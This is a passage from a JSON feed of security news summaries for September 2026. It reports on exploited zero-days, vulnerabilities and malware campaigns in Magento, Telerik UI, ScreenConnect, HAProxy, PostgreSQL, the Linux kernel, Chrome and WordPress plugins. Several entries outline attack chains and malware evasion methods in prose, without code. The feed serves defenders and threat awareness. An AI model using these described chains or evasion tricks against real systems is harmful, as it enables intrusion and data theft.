Hotpatching is now generally available for Windows Server Azure Edition VMs, and that Windows Server 2012 and Exchange 2016 are approaching end of support.",
  "src": "Microsoft Security Update Guide, BleepingComputer, SecurityWeek (citing ZDI's Dustin Childs and Tenable's Satnam Narang), CybersecurityNews, Cryptika, securityonline.info, Action1, ntcompatible, Help Net Security — Sep 8, 2026"
 },
 {
  "key": "stylesmuggler",
  "badge": "new",
  "tags": [
   [
    "crit",
    "Magento / Adobe Commerce · CVE-2026-75650 · CVSS 10.0 · Exploited zero-day"
   ],
   [
    "crit",
    "Commercial Facilities · Unauthenticated RCE · Emergency hotfix Sep 7"
   ]
  ],
  "title": "Sansec discloses StyleSmuggler, an unauthenticated RCE zero-day in Magento and Adobe Commerce exploited from Sep 4; Adobe shipped an emergency hotfix on Sep 7",
  "body": "Dutch e-commerce security firm Sansec published an early advisory on Sep 5, 2026 for a zero-day it named StyleSmuggler, stating that it found the campaign on Sep 4 at 22:40 UTC and was \"publishing early because stores are being compromised right now.\" Sansec describes an unauthenticated remote code execution chain that injects PHP into Magento's template system using the styles properties to evade existing safeguards. It works in two stages: poison PHP code, for example by generating a failure report, then let Magento execute the poisoned code when it renders the standard \"Payment Transaction Failed Reminder\" email. Sansec states no user interaction is required — nobody needs to open the email, because the code runs while Magento renders it, and the attack can also succeed when email delivery fails. Sansec reproduced the full unauthenticated chain on clean Magento Open Source installations of 2.4.7, 2.4.8 and 2.4.9; the first confirmed victim was running an older 2.4.6-p15 build with all available security patches applied. Adobe published an emergency hotfix on Sep 7 for CVE-2026-75650, rated CVSS 10.0, distributed as VULN-39341 under APSB26-146; Sansec states every version from 2.4.4 up to and including 2.4.9 is affected. Successful exploitation installs a compact Rust-based Linux backdoor running as a background process. Early samples disguised themselves as [kworker/u:8:0], mimicking a kernel worker; newer samples observed on Sep 6 use the name fc-cache and copy themselves to ~/.cache/fontconfig/fc-cache, and Sansec also documents a chronyd variant. BleepingComputer reports the attacker adds a cron job repeating every 30 minutes for persistence. Earlier samples used TLS and WebSockets for command and control, while newer ones disguise their traffic as NTP — UDP to port 123, using hostnames that resemble time-syncing infrastructure. The malware also determines the server's public IP through ipify, icanhazip, ident.me and ipinfo.io, and checks TracerPid, installing but not beaconing if tracing is active. Sansec records a second attacker and a recon probe, and one merchant reporting an attempt that failed against session storage followed eight seconds later by a successful attempt using a file uploaded through Magento's custom options, both from the same operator; moving sessions to Redis or the database does not stop the attack. Magento is installed on more than 160,000 websites including 14,000 of the top one million sites.",
  "src": "Sansec Forensics Team advisory (published Sep 5, last updated Sep 7, 2026 20:45 UTC), BleepingComputer, SecurityWeek, The Hacker News, SOCRadar, SecPod, cyberpress.org — Sep 5–7, 2026"
 },
 {
  "key": "telerikrau",
  "badge": "new",
  "tags": [
   [
    "crit",
    "Telerik UI for ASP.NET AJAX · CVE-2026-13181/13182/13183/13184 · Public exploit"
   ],
   [
    "high",
    "Information Technology · Unauthenticated RCE · Patched Jul 8, tooling public Sep 7"
   ]
  ],
  "title": "TantoSec publishes a working exploit chain turning a Telerik UI padding oracle into unauthenticated RCE, two months after Progress patched it",
  "body": "Security firm TantoSec published a detailed write-up and working tooling on Sep 7, 2026 for a four-flaw chain in Telerik UI for ASP.NET AJAX that gives an unauthenticated attacker remote code execution on the hosting server. The underlying flaws are not new: Progress Software shipped the fix in version 2026.2.708 (2026 Q2 SP1) on Jul 8 and published the CVEs and advisory on Jul 22. What changed on Sep 7 is the disclosure of the method and the tooling — TantoSec's Marcio Almeida walked through the full chain and released a command-line tool, telerik-rau-exploit, along with two mixed-mode DLL payloads, one that writes a web shell to disk and one that runs entirely in memory. At the centre of the chain is CVE-2026-13182, an AES-CBC padding oracle in the RadAsyncUpload control: the code behaves differently when ciphertext has invalid padding than when it has valid padding but decrypts to malformed JSON, letting an attacker infer plaintext and construct chosen encrypted values without the key. CVE-2026-13183 is a timing-based variant of the same oracle used when detailed errors are hidden. CVE-2026-13181 is an unguarded type-resolution flaw: Telerik resolves the .NET type name supplied in AsyncUploadTypeName without an allowlist, so if a server-side FileUploaded handler reads the UploadResult property, corrupt data is deserialized into the named type. Combined with the System.Configuration.Install.AssemblyInstaller gadget this loads an uploaded mixed-mode DLL from a temporary directory and executes native code through its DllMain entry point. CVE-2026-13184, a predictable default key, applies only to an alternative attack mode the released demonstration did not use. Exploitation requires a non-default configuration — a page using RadAsyncUpload with a FileUploaded handler that reads UploadResult — and reporting notes no confirmed exploitation in the wild. Affected releases run from 2010.1.309 through 2026.2.519. Progress's July bulletin also covers a second, distinct RCE chain in the RadPersistenceManager and RadDockLayout components (CVE-2026-13185, CVE-2026-13186 and CVE-2026-13190), credited to CODE WHITE's Markus Wulftange and Progress, for which no public exploit has been released.",
  "src": "TantoSec (Marcio Almeida) write-up and telerik-rau-exploit release, Progress Software advisory (Jul 22, 2026), The Hacker News, CybersecurityNews, cyberpress.org — Jul 8 – Sep 7, 2026"
 },
 {
  "key": "screenconnectworm",
  "badge": "new",
  "tags": [
   [
    "high",
    "ConnectWise ScreenConnect · No CVE · Worm-like propagation"
   ],
   [
    "high",
    "All Sectors · Rogue RMM clients · Vendor advisory Sep 3"
   ]
  ],
  "title": "Huntress finds rogue ScreenConnect clients pushing a VBScript chain to newly connected endpoints; ConnectWise advises disabling file transfer while a fix is prepared",
  "body": "Huntress published research on Sep 3, 2026 describing the same anomalous pattern across unrelated endpoints in multiple organisations: rogue ScreenConnect clients repeatedly spawning wscript.exe to execute four VBScript files named 1.vbs, 2.vbs, 3.vbs and 4.vbs from ScreenConnect temporary directories. A closer look at the payloads revealed a worm-like attack chain — previously installed, modified ScreenConnect clients can automatically transfer and execute the same four scripts on newly connected ScreenConnect endpoints. The campaign began in late August and starts with social engineering rather than a vulnerability. In an Aug 20 incident a threat actor posing as technical support instructed the victim to run Windows' built-in Quick Assist, took remote control, and installed the rogue client, which almost immediately launched the four VBScript files. Network telemetry identified active connections from ScreenConnect to multiple remote IP addresses. Huntress observed the same files and operations in an Aug 24 attack that also began with social engineering. The incidents share a WindowsServiceHost User Run Key pointing to WindowsServiceHost.vbs in the user's AppData directory for persistence, and Huntress also observed other remote monitoring and management tools, including UltraViewer, on some impacted hosts. Reporting describes the payload stages as reconnaissance, PowerShell execution and cleanup. Huntress updated its post on Sep 3 following a ConnectWise advisory; ConnectWise advises disabling file transfer — the TransferFiles and TransferFilesInSession permissions — until a fix is released. There is no CVE for the propagation behaviour.",
  "src": "Huntress research (John Hammond, Andrew Brandt, Lindsey O'Donnell-Welch; published Sep 3, 2026), ConnectWise advisory (Sep 3, 2026), SecurityWeek, GBHackers, Cyberpresso — Sep 3–7, 2026"
 },
 {
  "key": "dprkted",
  "badge": "new",
  "tags": [
   [
    "high",
    "DPRK-aligned · ted backdoor / CurlRAT · HAProxy implant"
   ],
   [
    "high",
    "Critical Manufacturing · Communications · Long-term espionage"
   ]
  ],
  "title": "Rapid7 documents a North Korea-aligned Linux espionage toolkit that compiles a backdoor into HAProxy and injects scripts into passing web traffic",
  "body": "Rapid7 reported on Sep 7, 2026 that North Korea-aligned threat actors have been using a new Linux toolkit against automotive and media organisations in South Korea. The framework consists of a HAProxy instance Rapid7 calls the \"ted backdoor\" plus trojanized versions of agetty, atd, crond, polkitd and sshd, and supports remote command execution, credential harvesting and script injection into web traffic. The ted backdoor is a custom HAProxy plugin compiled within the HAProxy source code — Rapid7 observed it built as part of HAProxy version 2.8.12 running in the victim environment — and hooked directly into the balancer's built-in HTTP parser. Rapid7 states it \"uses its native filter API, internal memory pools, event scheduler, and process management infrastructure to intercept traffic and hide from monitoring, while genuine load balancing traffic operates as expected.\" Initial access to an edge server came through exploitation of a Groupware login portal vulnerability; an SSH keylogger, which also served as a staging server, was used for credential harvesting and lateral movement to internal systems. Rapid7 describes the deployment logic: \"The stager checks for the presence of either crond or HAProxy, and only then deploys CurlRAT, retrieving it either from its data section or the edge web server. In parallel, the ted backdoor is dropped onto the HAProxy load balancer.\" CurlRAT, a curl-based RAT, polls its command-and-control server every 12 hours and can decrypt and execute commands stored in its configuration, write a new configuration payload to disk, and deploy a full interactive PTY shell. Once installed, the balancer starts redirecting or serving malicious content to selected clients browsing through it. The actor registered domains under low-cost commodity top-level domains and blended payload delivery into normal browsing by mimicking Naver's pstatic.net static content domain. Rapid7 assesses the toolkit has likely been in use since late 2024, when the HAProxy version involved was released, and notes the artefacts and infrastructure point to watering-hole techniques previously used by APT37 and Lazarus, with the campaign timeframe overlapping Operation SyncHole, attributed to Lazarus last year.",
  "src": "Rapid7 threat research — DPRK APTs' ted backdoor and CurlRAT target South Korean media and automotive sectors, SecurityWeek — Sep 7, 2026"
 },
 {
  "key": "hpeaoscx",
  "badge": "new",
  "tags": [
   [
    "crit",
    "HPE Aruba Networking AOS-CX · CVE-2026-73749 · CVSS 9.8"
   ],
   [
    "med",
    "Communications · Information Technology · Patched, no reported exploitation"
   ]
  ],
  "title": "HPE patches nearly two dozen AOS-CX issues tracked collectively as CVE-2026-73749",
  "body": "HPE released updates for AOS-CX, the operating system on its Aruba Networking switching range, addressing nearly two dozen issues tracked collectively under CVE-2026-73749 with a CVSS score of 9.8. SecurityWeek reported the release on Sep 4, 2026 as critical remote code execution vulnerabilities. No exploitation has been reported in the sources reviewed, and no indicators were published.",
  "src": "HPE Aruba Networking security advisories, SecurityWeek — Sep 4, 2026"
 },
 {
  "key": "ncentral86218",
  "badge": "",
  "tags": [
   [
    "crit",
    "N-able N-central · CVE-2026-86218 · CVSS 10.0 · Exploited zero-day"
   ],
   [
    "crit",
    "Information Technology · MSP RMM · Pre-auth RCE"
   ]
  ],
  "title": "N-able ships a fourth N-central hotfix for CVE-2026-86218, a pre-auth RCE zero-day reported exploited in the wild and unrelated to the two CVEs patched a day earlier",
  "body": "On Sep 6, 2026 N-able issued N-central 2026.3 Hotfix 4 for CVE-2026-86218, a pre-authentication remote code execution vulnerability rated CVSS 10.0. Huntress, which published the rapid response, states HF4 supersedes all prior hotfixes and that systems running HF3 (build 2026.3.1.13) remain vulnerable; hosted NCOD instances were patched by N-able. In an MSPGeek Discord thread quoted by Huntress, N-able's Jason Murphy wrote that after the earlier disclosures \"a third, independent researcher alerted us to a new vulnerability that has been exploited in the wild that is unrelated to the previously disclosed CVEs,\" and described it as a critical zero-day allowing pre-authenticated access to the N-central server; he separately confirmed \"this one is a Zero day.\" Huntress notes a discrepancy in N-able's own communications: the MSPGeek post and N-able's Active Incident page say the flaw has been observed exploited in the wild, while the HF4 release notes state \"At this time, we have no confirmations that this vulnerability has been exploited in production environments, but unpatched systems remain at risk.\" The day before, on Sep 5, Huntress published a validated proof of concept for a net-new authentication bypass chain against the then-current 2026.3.1.10 build, potentially leveraging CVE-2026-86206 and CVE-2026-86207, which allows attackers to bypass access controls and create unauthorized administrative accounts; that chain is distinct from the August flaws CVE-2026-18556 and CVE-2026-18577. Huntress's investigation began Sep 4 after a fully patched customer N-central production environment was compromised, and it states that because appliance logs had already rotated it cannot confirm which vulnerability was used. N-central is an RMM platform used by MSPs to monitor, patch and remotely access endpoints across all of their customers; Huntress notes a compromised server can push scripts and jobs, deploy dual-use tooling, and open remote-control sessions into downstream domain controllers and servers.",
  "src": "Huntress rapid response (updated Sep 6, 2026), N-able security advisories and HF4 release notes, N-able Active Incident page, MSPGeek Discord thread quoted by Huntress"
 },
 {
  "key": "falconflank",
  "badge": "updated",
  "tags": [
   [
    "high",
    "Nightmare Eclipse drops · FalconFlank / PrettyPrague / GreenSection · Public PoCs"
   ],
   [
    "med",
    "All Sectors · Local privilege escalation to SYSTEM"
   ]
  ],
  "title": "Nightmare Eclipse follows FalconFlank with two more zero-day drops against Avast and Nvidia; Gen says it has fixed its issue and Kevin Beaumont says the exploits work",
  "body": "On Sep 3, 2026 a researcher operating as Nightmare Eclipse, also known as Chaotic Eclipse and MSNightmare, published a GitHub project called FalconFlank, described in its README as \"a 0day privilege escalation that abuses the office malicious macros remediation in Crowdstrike Falcon Sensor.\" The repository contains C++ source, a Visual Studio project, an embedded Office-document decoy, an embedded library payload and a precompiled 64-bit executable, and interacts with named pipes, reparse points, DLL operations and Windows system APIs. Falcon's malicious-macro remediation runs with elevated privileges; the reported attack path is that a lower-privileged local user can cause that cleanup workflow to act on attacker-controlled files, escalating to SYSTEM. The researcher states the PoC works on a fully updated Windows 11 25H2 machine or Windows Server 2025 with the \"Microsoft Office file malicious macro removal\" capability enabled, and notes CrowdStrike may already detect the released code, so testing may require exclusions or changes to the DLL load technique. Truesec places the working conditions at Falcon Phase 3 Optimal Protection with that setting enabled; Rescana reports the affected scope as Falcon Sensor for Windows on Windows 11 and Windows Server 2026. A CrowdStrike spokesperson told The Hacker News the company is \"actively investigating these claims\" and advised customers to disable the Microsoft Office File Suspicious Macro Removal Windows policy setting, stating customers remain protected through the Cloud Anti-malware for Microsoft Office Files settings and referring customers to a FalconFlank Tech Alert in the support portal. As of Sep 3, 2026 SOCRadar records no CrowdStrike confirmation, no CVE, no CVSS score and no fix; the precise root cause is undocumented. Foresiet, which reviewed the repository without executing it, notes the \"0-day\" label is the author's claim rather than a vendor confirmation, and that public exploit code supports the attack concept without independently proving Falcon is vulnerable. No exploitation in the wild has been reported and the issue is not in CISA KEV. Updated Sep 7, 2026: SecurityWeek reports the researcher dropped three exploits within a short window — FalconFlank against CrowdStrike Falcon Sensor, PrettyPrague against the Avast sandbox, and GreenSection against Nvidia. PrettyPrague spawns a shell with full system privileges, and the researcher says it may also affect other GenDigital products including AVG and Norton. A GenDigital spokesperson told SecurityWeek the company \"was recently made aware of a security vulnerability affecting a subset of Gen products, including Avast Antivirus, that could allow an attacker to elevate their system privileges,\" that it \"immediately initiated our security response procedures and have fixed the issue,\" and encouraged users to keep products up to date. GreenSection targets an out-of-bounds memory write in a shared global memory section used by multiple Nvidia user-mode components; the researcher notes it \"does not get SYSTEM privileges immediately\" but \"can be used cross user to user boundary easily or even compromise the dwm.exe process,\" and says he did not look deeply into it. SecurityWeek emailed Nvidia for a statement and had not received one at publication. Security researcher Kevin Beaumont said late in the week that the Avast, CrowdStrike and Kaspersky exploits work. The same researcher released HardBreacher, a privilege escalation zero-day in a Kaspersky endpoint security product, in late August; Kaspersky patched it on Aug 31.",
  "src": "MSNightmare GitHub repositories FalconFlank, PrettyPrague and GreenSection, SecurityWeek (Sep 7, 2026), Kevin Beaumont via cyberplace.social, The Hacker News, BleepingComputer, Truesec, SOCRadar, Rescana, Foresiet, SOC Prime — Sep 3–7, 2026"
 },
 {
  "key": "postgreshell",
  "badge": "",
  "tags": [
   [
    "high",
    "PostgreSQL · CVE-2026-6471 · PostGREShell · CVSS 7.2"
   ],
   [
    "high",
    "All Sectors · Versions 9.4 through 18"
   ]
  ],
  "title": "Cyera details PostGREShell, a 12-year-old PostgreSQL flaw that turns a replication account into superuser and a persistent backdoor",
  "body": "Cyera Research Labs disclosed CVE-2026-6471 on Sep 1, 2026, a missing authorization defect in PostgreSQL's logical decoding that it calls PostGREShell, rated CVSS 7.2. A non-superuser holding the REPLICATION attribute can name an arbitrary logical decoding output plugin, which PostgreSQL passes to the loader without validation, causing the server to dlopen any file visible to the operating system account it runs as and execute code with the server process's privileges. Cyera states the flaw lets a low-privilege backup account reach remote code execution on Windows, Linux and macOS, escalate to full PostgreSQL superuser, and install persistent backdoor access including passwordless connections and restored superuser privileges. The defect sits in the logical decoding architecture introduced in PostgreSQL 9.4 in 2014, so every release from 9.4 through 18 is affected — Cyera confirmed it on 18.2 — and the vulnerable path exists wherever logical replication, change data capture or backup tooling is in use. Non-superuser accounts were meant to be restricted to an administrator-controlled plugin directory. The PostgreSQL project fixed it in 18.6, 17.11, 16.15, 15.19 and 14.24, released Aug 13, 2026, choosing a plugin allow-list rather than applying the standard LOAD restrictions, which would have forced all third-party plugins into $libdir/plugins. As a result, environments using third-party output plugins such as wal2json or decoderbufs can fail to initialise replication slots after updating, logging \"library may not be used as an output plugin\". Cyera credits Noah Misch and the PostgreSQL security team for coordinating the fix. A VirusTotal hunt by Cyera found 114 malicious PostgreSQL plugins in the wild including trojans, miners and reverse shells; the disclosure does not link any of them to exploitation of this CVE, and no in-the-wild exploitation has been reported.",
  "src": "Cyera Research Labs (Sep 1, 2026), SecurityWeek, Security Affairs, CSO Online, GBHackers, SC Media — Sep 3–5, 2026"
 },
 {
  "key": "linuxkernelpoc",
  "badge": "",
  "tags": [
   [
    "high",
    "Linux kernel · CVE-2026-52924 · CVE-2026-80714"
   ],
   [
    "med",
    "All Sectors · Local root, public exploit code"
   ]
  ],
  "title": "NebuSec publishes working root exploits for two Linux kernel use-after-free flaws, one of them first triaged upstream as denial of service",
  "body": "Security team NebuSec published technical detail and functional exploit code for two Linux kernel use-after-free vulnerabilities in the network stack, both carrying CVSS 9.8 in the reporting reviewed. CVE-2026-52924 is in the SCTP implementation: on a Stale Cookie event the association's stream state is released through sctp_stream_free() while scheduler dequeue paths continue to rely on stream->out_curr->ext, producing a slab use-after-free reported as a KASAN fault in sctp_sched_fcfs_dequeue. Upstream maintainers initially classified the bug as denial of service; NebuSec's proof of concept demonstrates local privilege escalation, verified on Ubuntu kernel 7.0.0-28. The upstream code dates to October 2017, so multiple long-term kernel branches are affected; the fix purges the association outqueue when handling the Stale Cookie case, dropping pending transmit and retransmit state so cached scheduler pointers are invalidated. Where SCTP is not required, unloading or blacklisting the module removes the attack surface. Separately, NebuSec published proof-of-concept code and a video for CVE-2026-80714 (CVSS 9.8), a use-after-free in the kernel's IPVS netfilter code, demonstrating root escalation on current Debian; that flaw is fixed across a series of upstream commits. Neither flaw has been reported as exploited in the wild, and both require local access, but the combination of public exploit code and a demonstration video shortens the interval before commodity use.",
  "src": "NebuSec research, securityonline.info (Sep 3 and Sep 5, 2026), Intruder CVE data / upstream kernel commit notes"
 },
 {
  "key": "chromev8",
  "badge": "",
  "tags": [
   [
    "crit",
    "Google Chrome · CVE-2026-85046 · V8 type confusion"
   ],
   [
    "high",
    "All Sectors · Exploited in the wild · KEV Sep 4"
   ]
  ],
  "title": "Google patches an exploited V8 type-confusion zero-day in Chrome; CISA added CVE-2026-85046 to KEV on Sep 4",
  "body": "Google released Chrome 152.0.7977.82/.83 for Windows and Mac and 152.0.7977.82 for Linux and Android on Sep 3, 2026, fixing twelve vulnerabilities including CVE-2026-85046, a high-severity type confusion in the V8 JavaScript engine. Chrome's Srinivas Sista wrote in the Sep 3 advisory that Google \"is aware of reports that an exploit for CVE-2026-85046 exists in the wild.\" The flaw was reported by an external researcher, Salvatore Gulizia. Type confusion in V8 allows a remote attacker to execute arbitrary code inside the browser's security sandbox through a maliciously crafted web page. Google withholds technical detail and bug access until the majority of users have updated, so no exploitation detail, targeting information or indicators have been published. CISA added the CVE to the Known Exploited Vulnerabilities catalog on Sep 4, 2026. The Android update is reaching Google Play over several days and automatic updates roll out to other platforms over the following days and weeks, so the practical exposure window is the update lag rather than the patch date. Chromium-derived browsers including Microsoft Edge, Opera and Brave inherit the defect and require their own vendor releases. Update, Sep 6: Security Affairs records CVE-2026-85046 as the sixth actively exploited Chrome zero-day fixed in 2026; no exploitation detail or indicators have been published since the advisory.",
  "src": "Google Chrome release advisory (Sep 3, 2026), Forbes, CISA KEV (Sep 4, 2026), securityonline.info — Sep 3–5, 2026"
 },
 {
  "key": "superforms",
  "badge": "",
  "tags": [
   [
    "crit",
    "Super Forms CVE-2026-14894 · CVSS 9.8"
   ],
   [
    "high",
    "Elementor Pro CVE-2026-32475 · 440,000+ attempts"
   ]
  ],
  "title": "Wordfence records more than 440,000 exploit attempts against unauthenticated file-upload flaws in Super Forms and Elementor Pro",
  "body": "Wordfence reports active mass exploitation of two unauthenticated arbitrary file-upload vulnerabilities in WordPress plugins. CVE-2026-14894 (CVSS 9.8) is a missing file-type validation flaw in Super Forms – Drag & Drop Form Builder affecting versions through 6.3.313. It was fixed in 6.3.314 on Jul 8, 2026 and disclosed publicly on Jul 9. Wordfence researcher Andrea Bocchetti found that the plugin's submit_form() routine processes file-upload fields through the unauthenticated super_submit_form AJAX handler, base64-decoding a supplied data URI and writing it to disk without validating the type. Bocchetti notes the flaw may also permit path traversal outside the intended upload directory. Wordfence's firewall has blocked more than 250,000 attempts against it; exploitation began Jul 14, the day the rule reached Premium, Care and Response customers, free users received it on Aug 13, and the heaviest activity ran Aug 18–25. Super Forms has an estimated 13,000 active installations. CVE-2026-32475 (scored 9.0 and 9.8 in different sources) is the equivalent flaw in Elementor Pro, fixed in 4.2.2; uploaded PHP files land in /wp-content/uploads/elementor/forms/ under a randomly generated filename with the attacker-supplied .php extension and can then be requested directly to run commands on the server. Exploitation of the Elementor Pro flaw began Aug 19, 2026. In both cases the outcome is a PHP web shell, from which Wordfence describes attackers creating administrator accounts, exfiltrating data, deploying phishing or spam infrastructure and overwriting files writable by the web server. Wordfence advises patching immediately, scanning for indicators of compromise and auditing for unexpected or recently modified .php files.",
  "src": "Wordfence threat intelligence, The Hacker News, GBHackers, Cyberpress, securityonline.info, Patchstack — Sep 4–5, 2026"
 },
 {
  "key": "nodeabuse",
  "badge": "",
  "tags": [
   [
    "high",
    "Node.js runtime abuse · Woodgnat / KongTuke"
   ],
   [
    "high",
    "Government Facilities · Information Technology · Commercial Facilities"
   ]
  ],
  "title": "Symantec documents a return to Node.js abuse: attackers install the signed runtime to run implants that payload-blocking had stopped",
  "body": "The Symantec Threat Hunter Team reported on Sep 3, 2026 that attackers have revived the use of Node.js as an execution vehicle since February 2026, in campaigns against government departments, technology companies and hotels. In an intrusion at an Asian technology start-up running from March to July 2026, initial access came through ClickFix social engineering, and after repeated attempts to deploy AdaptixC2 agents and Cobalt Strike Beacon were blocked on the victim network, the attackers downloaded the official Node.js installer from nodejs.org and used the trusted, signed node.exe runtime to execute a malicious JavaScript implant. The implant held its foothold for months and made repeated connections to Ethereum blockchain gateways, an EtherHiding-style channel Symantec assesses was most likely used to retrieve commands or further payloads. Persistence combined a Windows service-launched PowerShell downloader with a registry Run key that relaunched node.exe at login; Symantec also observed domain spoofing of a company called Devmine, with 'datalyerservice' used as a command-and-control server. Because the malicious logic stays in interpreted script rather than in a binary, signature-based detection and binary allow-listing are weakened. Symantec links some of the activity to ModeloRAT and Backdoor.Mistic (MLTBackdoor), assessed to be the work of the initial access broker Woodgnat, also tracked as KongTuke, which has been publicly linked to intrusions involving Qilin, Interlock, Rhysida, Akira, 8Base, Black Basta and Embargo ransomware. Symantec's June 2026 reporting described the same actor abusing node.exe alongside a malicious Chrome extension named NexShield in a ClickFix variant it calls CrashFix, and a .NET payload named GateKeeper with layered encryption and victim-fingerprinting logic. The same tradecraft was seen against a US fintech organisation, where the earliest observed activity was May 6, 2026 and the intrusion led to C2Looper, a Rust-based backdoor documented by Zscaler ThreatLabz. Symantec's assessment is that the technique's return reflects Node.js popularity rather than actor sophistication: attackers of varying skill levels are using it.",
  "src": "Symantec Threat Hunter Team / security.com (Sep 3, 2026), The Hacker News, Cyber Recaps, OffSeq Threat Radar — Sep 3–4, 2026"
 },
 {
  "key": "magleak",
  "badge": "",
  "tags": [
   [
    "crit",
    "Manchester Airports Group · FulcrumSec"
   ],
   [
    "high",
    "Transportation Systems · 8.7M people"
   ]
  ],
  "title": "FulcrumSec publishes the full Manchester Airports Group dataset after the operator refuses to pay, claiming access through admin keys left in website JavaScript",
  "body": "Manchester Airports Group disclosed on Aug 27, 2026 that an unauthorised third party had accessed customer data relating to approximately 8.7 million people across Manchester, London Stansted and East Midlands airports, covering car park, lounge and Fast Track bookings and in-airport Wi-Fi sign-ups. MAG said the data was held in a database hosted by a third party, that email addresses, phone numbers, vehicle registrations and postcodes were exfiltrated, that bank details, payment card data, account passwords and passport numbers are not stored in the affected system, and that airport operations were unaffected. MAG confirmed to the BBC that a ransom was demanded and refused. The extortion group FulcrumSec claimed the breach on Aug 30 in reporting by BleepingComputer, initially describing 86 GB of compressed data, and published the dataset on its leak site on Sep 2. Volume figures differ between sources: SecurityWeek and Computer Weekly describe roughly 550 GB of uncompressed data and half a terabyte respectively, while BleepingComputer reports FulcrumSec saying the exported files total roughly 640 GB extracted, and Hackread counts four archives totalling 74.5 GB compressed. Have I Been Pwned lists email addresses and phone numbers for 8.8 million people. FulcrumSec's own listing claims names, emails, phone numbers, town and postal region and residential IP addresses, and reporting describes booking history, travel dates, vehicle information and purchase references as also present — more detail than MAG's initial disclosure indicated. FulcrumSec told BleepingComputer it obtained access using exposed Iterable API credentials found in client-side JavaScript on each of the three airport root domains; MAG has not publicly confirmed that access path. The group had said it might withhold roughly 200,000 upcoming-travel records on harm grounds, as it did during its Novo Nordisk extortion in June 2026; whether it did so is not established in the reporting reviewed. TechTimes records FulcrumSec as active since approximately September 2025 with about 25 claimed victims across 11 countries, operating a data-theft model without ransomware encryption.",
  "src": "MAG statements via BBC, SecurityWeek, BleepingComputer, Computer Weekly, Cybernews, TechTimes, Have I Been Pwned — Aug 27 – Sep 4, 2026"
 },
 {
  "key": "wpmigration",
  "badge": "",
  "tags": [
   [
    "high",
    "All-in-One WP Migration · CVE-2026-19949 · CVSS 8.8"
   ],
   [
    "high",
    "Commercial Facilities · 5M+ installs, ~3.25M unpatched"
   ]
  ],
  "title": "Second-order SQL injection in a WordPress backup plugin leaves roughly 3.25 million sites exposed, with a weaponised exploit already recorded",
  "body": "Wordfence published full technical detail on Sep 2, 2026 for CVE-2026-19949, an unauthenticated second-order SQL injection in ServMask's All-in-One WP Migration and Backup plugin affecting all versions through 7.109. Wordfence rates it 8.8 on CVSS. The plugin has more than five million active installations; ServMask shipped the fix in version 7.110 on Aug 20, thirteen days before the public advisory, but as of Sep 2 only about 35 percent of the install base had applied it, leaving roughly 3.25 million sites unpatched. The vulnerability is not exploited at submission time: an unauthenticated attacker plants crafted data through a public input channel such as a WordPress trackback, where it passes web application firewall inspection as ordinary comment data and is written to the database dormant. When an administrator later runs an export, import or restore — the plugin's core function — the plugin rewrites stored database content including URLs and table prefixes, incorrectly parses escaped backslashes and quotation marks, and executes the injected SQL. The injection can write the plugin's ai1wm_secret_key to a public location such as a comment; an attacker who retrieves that key can use the plugin's own import path to unpack a malicious .wpress archive containing executable code, reaching remote code execution and site takeover. Security researcher Jack Taylor reported the flaw in mid-August through Wordfence's bug bounty programme, receiving a 5,761 dollar award. As of Sep 3, SOCRadar records one public proof-of-concept repository for the CVE with one variant marked weaponised, and classifies the exploitation status as reported but without independent confirmation in its sources.",
  "src": "Wordfence (Sep 2, 2026), BleepingComputer, SC Media, GBHackers, SOCRadar, SentinelOne vulnerability database — Sep 2–3, 2026"
 },
 {
  "key": "brazetsu",
  "badge": "",
  "tags": [
   [
    "high",
    "BraZetsu · Exilware · Initial access broker tooling"
   ],
   [
    "med",
    "Financial Services · Critical Manufacturing · Government Facilities"
   ]
  ],
  "title": "Group-IB details BraZetsu, a Python framework that profiles compromised Windows hosts and prices them for sale to access brokers",
  "body": "Group-IB analysts Julio Guapo Menezes and Miguel Salazar published a technical report on the modular Python Windows framework BraZetsu, first seen in early May 2026 and attributed to the Brazilian threat actor Exilware. The report's central point is the business model rather than the malware class: instead of stealing credentials and exiting, BraZetsu catalogues compromised systems as tradable assets on an underground marketplace, letting buyers execute their own tooling on hosts they did not have to breach. The framework conducts reconnaissance across more than twenty categories including banking systems, ERP platforms such as TOTVS, SAP, Sankhya and Senior, SCADA infrastructure, government systems and cryptocurrency platforms, and uses generative AI to triage collected data and prioritise high-value targets. It collects .pfx and .p12 digital certificates including those in user profiles and OneDrive locations, extracts browser history from Chrome, Edge, Brave, Vivaldi and Opera and compares URLs against a list of nearly 230 targeted domains and paths, tracks user behaviour through screen captures, and searches local and network directories for Brazilian CNAB remittance files used to send bulk payment instructions to banks. Group-IB assesses with high confidence, on shared codebase, build methodology, infrastructure and payload architecture, that BraZetsu and the Python backdoor AgenteV2 are the same framework; one BraZetsu IP address had previously been linked to AgenteV2 campaigns phishing Brazilian users with fake judicial summonses, and AgenteV2 can stream a victim's screen in real time to watch for banking sessions. A related tool, CNABHunter, parses CNAB files and can replace legitimate payment details with attacker-controlled bank accounts, PIX keys or barcodes. Recent versions focus on Brazilian infrastructure, though access has also been advertised for compromised systems in the United States. Group-IB notes verbose Portuguese-language logging, emoji-heavy status messages and development artefacts suggesting extensive use of generative AI during development, and says some samples were fully undetected on VirusTotal at the time of analysis.",
  "src": "Group-IB blog — Anatomy of BraZetsu (Sep 1, 2026), The Hacker News, GBHackers — Sep 3, 2026"
 },
 {
  "key": "ciscosep",
  "badge": "",
  "tags": [
   [
    "crit",
    "Cisco IOS XR · Nexus 9000 · CVSS 9.8"
   ],
   [
    "high",
    "Communications · Core network infrastructure"
   ]
  ],
  "title": "Cisco patches critical IOS XR and Nexus 9000 flaws found by internal testing and frontier AI models, days after Fire Ant implants were found on IOS XR routers",
  "body": "Cisco PSIRT published its September 2026 advisory set on Sep 2, 2026. The IOS XR Software Security Hardening Release groups multiple internally discovered vulnerabilities by CWE class under seven CVEs: CVE-2026-20274 and CVE-2026-20279 are rated CVSS 9.8, and CVE-2026-20275 through CVE-2026-20278 and CVE-2026-20280 top out between 8.2 and 8.8. CVE-2026-20274 covers memory-safety and resource-lifetime bugs including buffer overflows and use-after-free conditions, reachable by sending malformed network packets to trigger memory corruption inside core routing daemons. CVE-2026-20279 covers access-control bugs including missing authentication for critical functions and improper certificate validation, allowing authorization checks to be bypassed to perform administrative actions without valid credentials. The affected services are fundamental routing components — BGP, OSPF, IS-IS and gRPC endpoints. Cisco's advisory states the vulnerabilities affect all releases regardless of device configuration, that there are no workarounds, and that they were found during internal security testing \"using existing testing processes as well as frontier AI models.\" Cisco says they are not known to be actively exploited. Separately, CVE-2026-20212 (CVSS 9.8) in Nexus 9000 Series switches running Silicon One lets a remote unauthenticated attacker connect to by-default accessible TCP ports and 